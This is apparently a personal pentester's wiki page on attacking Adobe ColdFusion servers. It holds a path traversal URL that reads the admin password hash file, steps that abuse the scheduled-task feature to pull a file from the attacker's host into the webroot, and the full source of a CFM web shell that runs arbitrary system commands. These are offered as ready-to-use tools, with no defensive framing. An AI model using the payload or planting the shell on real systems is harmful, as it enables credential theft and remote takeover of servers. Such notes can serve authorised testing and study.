Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-11-30T10:32:44-05:00

====== ColdFusion ======
Created Tuesday 30 November 2021

===== SEE =====
https://pentest.tonyng.net/attacking-adobe-coldfusion/


===== Get password hash =====
http://<host>/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en

If vulnerable, the SHA1 hash of the password is returned

===== Metasploit =====
* [[Tools:Linux:MetaSploit:modules:auxiliary:scanner:http:coldfusion locale traversal|auxiliary/scanner/http/coldfusion_locale_traversal]]


===== Get RCE capability =====
This involves copying a .cfm 
{{./pasted_image002.png?width=1250}}
* In the menu, go to debuggin & logging > scheduled task
* Fill in task name
* Fill in frequency
* Fill in url of you host that serves the RCE form
* Click 'save output to file'
* Enter location where file should be stored. Probably:   C:\inetpub\wwwroot\rce.cfm
* Click submit

{{./pasted_image001.png}}
* Click the green button to execute the task immediately


===== Use RCE as such =====
{{./pasted_image003.png}}

===== CFM Shell =====
{{{code: lang="texinfo" linenumbers="False"
<html>
<body>
 
Notes:<br><br>
<ul>
<li>Prefix DOS commands with "c:\windows\system32\cmd.exe /c command" or wherever cmd.exe is</li>
<li>Options are, of course, the command line options you want to run</li>
<li>CFEXECUTE could be removed by the admin. If you have access to CFIDE/administrator you can re-enable it</li>
</ul>

<cfoutput>
    <form method="POST" action="cfexec.cfm">
    <table>
        <tr><td>Command:</td><td><input type=text name="cmd" size=50
        <cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>><br></td></tr>
        <tr><td>Options:</td><td> <input type=text name="opts" size=50
        <cfif isdefined("form.opts")>value="#form.opts#"</cfif>><br></td></tr>
        <tr><td>Timeout:</td><td> <input type=text name="timeout" size=4
        <cfif isdefined("form.timeout")>value="#form.timeout#"
        <cfelse>value="5"</cfif>></td></tr>
    </table>
    <input type=submit value="Exec">
</form>
     
<cfif isdefined("form.cmd")>
<cfsavecontent variable="myVar">
<cfexecute name = "#Form.cmd#" arguments = "#Form.opts#" timeout = "#Form.timeout#"> </cfexecute>
</cfsavecontent>
<pre> #myVar# </pre>
</cfif>
</cfoutput>
</body>
</html>

}}}
